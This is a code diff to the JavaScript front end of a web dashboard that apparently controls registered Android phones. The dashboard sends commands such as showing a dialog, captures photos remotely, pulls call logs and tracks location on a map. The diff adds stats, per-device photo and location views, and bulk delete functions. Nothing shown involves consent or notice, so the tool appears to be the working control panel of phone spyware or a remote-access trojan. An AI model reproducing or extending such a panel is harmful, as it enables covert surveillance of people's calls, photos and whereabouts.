@@ -1,5 +1,5 @@
 const API_BASE = window.location.origin;
-const WS_URL = `ws://${window.location.host}/ws?client=dashboard`;
+const WS_URL = `${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws?client=dashboard`;
 
 let ws = null;
 let selectedDevice = null;
@@ -11,6 +11,7 @@ document.addEventListener('DOMContentLoaded', () => {
   initNav();
   connectWS();
   refreshDevices();
+  refreshStats();
   initMap();
 });
 
@@ -22,6 +23,11 @@ function initNav() {
       document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
       btn.classList.add('active');
       document.getElementById(`sec-${btn.dataset.section}`).classList.add('active');
+
+      if (btn.dataset.section === 'stats') refreshStats();
+      if (btn.dataset.section === 'calllogs') refreshCallLogs();
+      if (btn.dataset.section === 'photos') refreshPhotos();
+      if (btn.dataset.section === 'commands') refreshAllCommands();
     });
   });
 }
@@ -43,18 +49,54 @@ function connectWS() {
 
   ws.onmessage = (e) => {
     const msg = JSON.parse(e.data);
-    if (msg.type === 'device_response') {
-      handleDeviceResponse(msg);
-    }
+    if (msg.type === 'device_response') handleDeviceResponse(msg);
   };
 }
 
 function handleDeviceResponse(msg) {
   const status = msg.success ? 'Command succeeded' : 'Command failed';
   showToast(`${msg.command_type}: ${status}${msg.data ? ' - ' + msg.data : ''}`, !msg.success);
+  if (selectedDevice === msg.device_id) loadCommandHistory(msg.device_id);
+}
 
-  if (selectedDevice === msg.device_id) {
-    loadCommandHistory(msg.device_id);
+// ===== Confirm Modal =====
+let confirmCallback = null;
+
+function showConfirm(title, message, callback) {
+  document.getElementById('confirmTitle').textContent = title;
+  document.getElementById('confirmMessage').textContent = message;
+  document.getElementById('confirmBtn').onclick = () => {
+    closeConfirm();
+    callback();
+  };
+  document.getElementById('confirmModal').classList.remove('hidden');
+}
+
+function closeConfirm() {
+  document.getElementById('confirmModal').classList.add('hidden');
+}
+
+// ===== Stats =====
+async function refreshStats() {
+  try {
+    const res = await fetch(`${API_BASE}/api/stats`);
+    const stats = await res.json();
+
+    document.getElementById('storageStats').innerHTML = `
+      <div class="stat-card"><div class="stat-number">${stats.devices}</div><div class="stat-label">Devices</div></div>
+      <div class="stat-card"><div class="stat-number">${stats.photos}</div><div class="stat-label">Photos</div></div>
+      <div class="stat-card"><div class="stat-number">${stats.call_logs}</div><div class="stat-label">Call Logs</div></div>
+      <div class="stat-card"><div class="stat-number">${stats.locations}</div><div class="stat-label">Locations</div></div>
+      <div class="stat-card"><div class="stat-number">${stats.commands}</div><div class="stat-label">Commands</div></div>
+    `;
+
+    document.getElementById('sidebarStats').innerHTML = `
+      <div class="stat-item"><span>Devices</span><span>${stats.devices}</span></div>
+      <div class="stat-item"><span>Photos</span><span>${stats.photos}</span></div>
+      <div class="stat-item"><span>Call Logs</span><span>${stats.call_logs}</span></div>
+    `;
+  } catch (e) {
+    console.error('Stats error:', e);
   }
 }
 
@@ -72,14 +114,14 @@ async function refreshDevices() {
 function renderDevices(devices) {
   const container = document.getElementById('deviceList');
   if (devices.length === 0) {
-    container.innerHTML = '<div class="empty-state">No devices registered yet. Open the app and start the service.</div>';
+    container.innerHTML = '<div class="empty-state">No devices registered yet.</div>';
     return;
   }
 
   container.innerHTML = devices.map(d => `
     <div class="device-card" onclick="selectDevice('${d.id}')">
       <h3>${d.device_name || 'Unknown Device'}</h3>
-      <div class="meta">${d.device_model || 'Unknown model'} | ${d.android_version || ''}</div>
+      <div class="meta">${d.device_model || ''} | ${d.android_version || ''}</div>
       <div class="meta">ID: ${d.id.substring(0, 12)}...</div>
       <div class="meta">Last seen: ${d.last_seen ? new Date(d.last_seen).toLocaleString() : 'Never'}</div>
       <span class="online-badge ${d.is_online ? 'online' : 'offline'}">${d.is_online ? 'Online' : 'Offline'}</span>
@@ -96,6 +138,8 @@ function selectDevice(deviceId) {
 
   loadCommandHistory(deviceId);
   loadDeviceLocation(deviceId);
+  loadDevicePhotos(deviceId);
+  loadDeviceLocations(deviceId);
 }
 
 function showDeviceList() {
@@ -113,11 +157,7 @@ async function sendCommand(commandType, payload = {}) {
     const res = await fetch(`${API_BASE}/api/command`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        device_id: selectedDevice,
-        command_type: commandType,
-        payload
-      })
+      body: JSON.stringify({ device_id: selectedDevice, command_type: commandType, payload })
     });
     const data = await res.json();
     showToast(`Command sent: ${commandType} (${data.status})`);
@@ -143,7 +183,6 @@ function sendDialog() {
   const title = document.getElementById('dialogTitle').value;
   const message = document.getElementById('dialogMessage').value;
   if (!message.trim()) return showToast('Enter a message', true);
-
   sendCommand('SHOW_DIALOG', { title, message });
   closeModal();
   document.getElementById('dialogMessage').value = '';
@@ -156,19 +195,13 @@ async function loadCommandHistory(deviceId) {
 
     const container = document.getElementById('commandHistory');
     if (commands.length === 0) {
-      container.innerHTML = '<div class="empty-state">No commands sent yet.</div>';
+      container.innerHTML = '<div class="empty-state">No commands yet.</div>';
       return;
     }
 
     container.innerHTML = `
       <table>
-        <thead>
-          <tr>
-            <th>Type</th>
-            <th>Status</th>
-            <th>Time</th>
-          </tr>
-        </thead>
+        <thead><tr><th>Type</th><th>Status</th><th>Time</th></tr></thead>
         <tbody>
           ${commands.map(c => `
             <tr>
@@ -241,7 +274,6 @@ async function loadDeviceLocation(deviceId) {
 
     const latest = locations[0];
     map.setView([latest.latitude, latest.longitude], 15);
-
     if (marker) map.removeLayer(marker);
     marker = L.marker([latest.latitude, latest.longitude]).addTo(map);
     marker.bindPopup(`Lat: ${latest.latitude}<br>Lng: ${latest.longitude}<br>Time: ${new Date(latest.timestamp).toLocaleString()}`);
@@ -250,6 +282,60 @@ async function loadDeviceLocation(deviceId) {
     infoBar.classList.remove('hidden');
   } catch (e) {
     console.error('Failed to load location:', e);
+  }
+}
+
+async function loadDeviceLocations(deviceId) {
+  try {
+    const res = await fetch(`${API_BASE}/api/device/${deviceId}/location`);
+    const locations = await res.json();
+
+    const container = document.getElementById('deviceLocations');
+    if (locations.length === 0) {
+      container.innerHTML = '<div class="empty-state">No location data.</div>';
+      return;
+    }
+
+    container.innerHTML = `
+      <table>
+        <thead><tr><th>Latitude</th><th>Longitude</th><th>Time</th></tr></thead>
+        <tbody>
+          ${locations.slice(0, 20).map(l => `
+            <tr>
+              <td>${l.latitude.toFixed(6)}</td>
+              <td>${l.longitude.toFixed(6)}</td>
+              <td>${new Date(l.timestamp).toLocaleString()}</td>
+            </tr>
+          `).join('')}
+        </tbody>
+      </table>
+    `;
+  } catch (e) {
+    console.error('Failed to load locations:', e);
+  }
+}
+
+// ===== Device Photos =====
+async function loadDevicePhotos(deviceId) {
+  try {
+    const res = await fetch(`${API_BASE}/api/device/${deviceId}/photos`);
+    const photos = await res.json();
+
+    const container = document.getElementById('devicePhotos');
+    if (photos.length === 0) {
+      container.innerHTML = '<div class="empty-state">No photos yet.</div>';
+      return;
+    }
+
+    container.innerHTML = photos.map(p => `
+      <div class="photo-card">
+        <button class="photo-delete" onclick="event.stopPropagation();deletePhoto('${p.id}')">&times;</button>
+        <img src="${p.storage_url}" alt="photo" loading="lazy" />
+        <div class="photo-meta">${p.camera_type} | ${new Date(p.created_at).toLocaleString()}</div>
+      </div>
+    `).join('');
+  } catch (e) {
+    console.error('Failed to load device photos:', e);
   }
 }
 
@@ -267,13 +353,13 @@ async function refreshCallLogs() {
 
   const container = document.getElementById('callLogsList');
   if (allLogs.length === 0) {
-    container.innerHTML = '<div class="empty-state">No call logs. Use "Get Call Log" command first.</div>';
+    container.innerHTML = '<div class="empty-state">No call logs.</div>';
     return;
   }
 
   container.innerHTML = `
     <table>
-      <thead><tr><th>Device</th><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th></tr></thead>
+      <thead><tr><th>Device</th><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th><th></th></tr></thead>
       <tbody>
         ${allLogs.map(l => `
           <tr>
@@ -283,6 +369,7 @@ async function refreshCallLogs() {
             <td>${l.call_type}</td>
             <td>${Math.floor(l.duration_seconds / 60)}m ${l.duration_seconds % 60}s</td>
             <td>${new Date(l.call_date).toLocaleString()}</td>
+            <td><button class="row-delete" onclick="deleteCallLog('${l.id}')">Delete</button></td>
           </tr>
         `).join('')}
       </tbody>
@@ -297,25 +384,193 @@ async function refreshPhotos() {
 
   for (const d of devices) {
     const photos = await fetch(`${API_BASE}/api/device/${d.id}/photos`).then(r => r.json());
-    allPhotos.push(...photos);
+    allPhotos.push(...photos.map(p => ({ ...p, device_name: d.device_name || d.id.substring(0, 12) })));
   }
 
   allPhotos.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
 
   const container = document.getElementById('photoGrid');
   if (allPhotos.length === 0) {
-    container.innerHTML = '<div class="empty-state">No photos. Use "Capture Photo" command first.</div>';
+    container.innerHTML = '<div class="empty-state">No photos.</div>';
     return;
   }
 
   container.innerHTML = allPhotos.map(p => `
     <div class="photo-card">
-      <img src="${p.storage_url}" alt="Captured photo" loading="lazy" />
-      <div class="photo-meta">
-        ${p.camera_type} camera | ${new Date(p.created_at).toLocaleString()}
-      </div>
+      <button class="photo-delete" onclick="event.stopPropagation();deletePhoto('${p.id}')">&times;</button>
+      <img src="${p.storage_url}" alt="photo" loading="lazy" />
+      <div class="photo-meta">${p.device_name} | ${p.camera_type} | ${new Date(p.created_at).toLocaleString()}</div>
     </div>
   `).join('');
+}
+
+// ===== DELETE FUNCTIONS =====
+
+async function deletePhoto(photoId) {
+  showConfirm('Delete Photo', 'Are you sure you want to delete this photo?', async () => {
+    try {
+      await fetch(`${API_BASE}/api/photos/${photoId}`, { method: 'DELETE' });
+      showToast('Photo deleted');
+      refreshPhotos();
+      if (selectedDevice) loadDevicePhotos(selectedDevice);
+      refreshStats();
+    } catch (e) {
+      showToast('Delete failed', true);
+    }
+  });
+}
+
+async function deleteCallLog(logId) {
+  showConfirm('Delete Call Log', 'Delete this call log entry?', async () => {
+    try {
+      await fetch(`${API_BASE}/api/calllogs/${logId}`, { method: 'DELETE' });
+      showToast('Call log deleted');
+      refreshCallLogs();
+      refreshStats();
+    } catch (e) {
+      showToast('Delete failed', true);
+    }
+  });
+}
+
+async function deleteDevicePhotos() {
+  if (!selectedDevice) return;
+  showConfirm('Delete All Device Photos', 'Delete all photos from this device?', async () => {
+    try {
+      await fetch(`${API_BASE}/api/device/${selectedDevice}/photos`, { method: 'DELETE' });
+      showToast('All device photos deleted');
+      loadDevicePhotos(selectedDevice);
+      refreshStats();
+    } catch (e) {
+      showToast('Delete failed', true);
+    }
+  });
+}
+
+async function deleteDeviceCallLogs() {
+  if (!selectedDevice) return;
+  showConfirm('Delete All Device Call Logs', 'Delete all call logs from this device?', async () => {
+    try {
+      await fetch(`${API_BASE}/api/device/${selectedDevice}/calllogs`, { method: 'DELETE' });
+      showToast('All call logs deleted');
+      loadCommandHistory(selectedDevice);
+      refreshStats();
+    } catch (e) {
+      showToast('Delete failed', true);
+    }
+  });
+}
+
+async function deleteDeviceLocations() {
+  if (!selectedDevice) return;
+  showConfirm('Delete All Locations', 'Delete all location data from this device?', async () => {
+    try {
+      await fetch(`${API_BASE}/api/device/${selectedDevice}/locations`, { method: 'DELETE' });
+      showToast('All locations deleted');
+      document.getElementById('deviceLocations').innerHTML = '<div class="empty-state">No location data.</div>';
+      document.getElementById('locationInfo').classList.add('hidden');
+      refreshStats();
+    } catch (e) {
+      showToast('Delete failed', true);
+    }
+  });
+}
+
+async function deleteAllDeviceData() {
+  if (!selectedDevice) return;
+  showConfirm('Delete All Device Data', 'This will delete ALL photos, call logs, locations, and commands for this device. Continue?', async () => {
+    try {
+      await fetch(`${API_BASE}/api/device/${selectedDevice}/photos`, { method: 'DELETE' });
+      await fetch(`${API_BASE}/api/device/${selectedDevice}/calllogs`, { method: 'DELETE' });
+      await fetch(`${API_BASE}/api/device/${selectedDevice}/locations`, { method: 'DELETE' });
+      await fetch(`${API_BASE}/api/device/${selectedDevice}/commands`, { method: 'DELETE' });
+      showToast('All device data deleted');
+      showDeviceList();
+      refreshDevices();
+      refreshStats();
+    } catch (e) {
+      showToast('Delete failed', true);
+    }
+  });
+}
+
+async function deleteDevice() {
+  if (!selectedDevice) return;
+  showConfirm('Delete Device', 'This will permanently delete the device and ALL its data. Continue?', async () => {
+    try {
+      await fetch(`${API_BASE}/api/device/${selectedDevice}`, { method: 'DELETE' });
+      showToast('Device deleted');
+      showDeviceList();
+      refreshDevices();
+      refreshStats();
+    } catch (e) {
+      showToast('Delete failed', true);
+    }
+  });
+}
+
+async function clearAllCommands() {
+  showConfirm('Clear All Commands', 'Delete ALL commands for ALL devices?', async () => {
+    try {
+      const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
+      for (const d of devices) {
+        await fetch(`${API_BASE}/api/device/${d.id}/commands`, { method: 'DELETE' });
+      }
+      showToast('All commands cleared');
+      refreshAllCommands();
+      refreshStats();
+    } catch (e) {
+      showToast('Clear failed', true);
+    }
+  });
+}
+
+async function clearAllCallLogs() {
+  showConfirm('Clear All Call Logs', 'Delete ALL call logs for ALL devices?', async () => {
+    try {
+      const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
+      for (const d of devices) {
+        await fetch(`${API_BASE}/api/device/${d.id}/calllogs`, { method: 'DELETE' });
+      }
+      showToast('All call logs cleared');
+      refreshCallLogs();
+      refreshStats();
+    } catch (e) {
+      showToast('Clear failed', true);
+    }
+  });
+}
+
+async function clearAllPhotos() {
+  showConfirm('Delete All Photos', 'Delete ALL photos from ALL devices? This removes files from storage too.', async () => {
+    try {
+      const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
+      for (const d of devices) {
+        await fetch(`${API_BASE}/api/device/${d.id}/photos`, { method: 'DELETE' });
+      }
+      showToast('All photos deleted');
+      refreshPhotos();
+      refreshStats();
+    } catch (e) {
+      showToast('Delete failed', true);
+    }
+  });
+}
+
+async function nukeAllData() {
+  showConfirm('DELETE EVERYTHING', 'This will permanently delete ALL devices, photos, call logs, locations, and commands. This cannot be undone!', async () => {
+    try {
+      const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
+      for (const d of devices) {
+        await fetch(`${API_BASE}/api/device/${d.id}`, { method: 'DELETE' });
+      }
+      showToast('All data deleted');
+      refreshDevices();
+      refreshStats();
+    } catch (e) {
+      showToast('Delete failed', true);
+    }
+  });
 }
 
 // ===== Toast =====
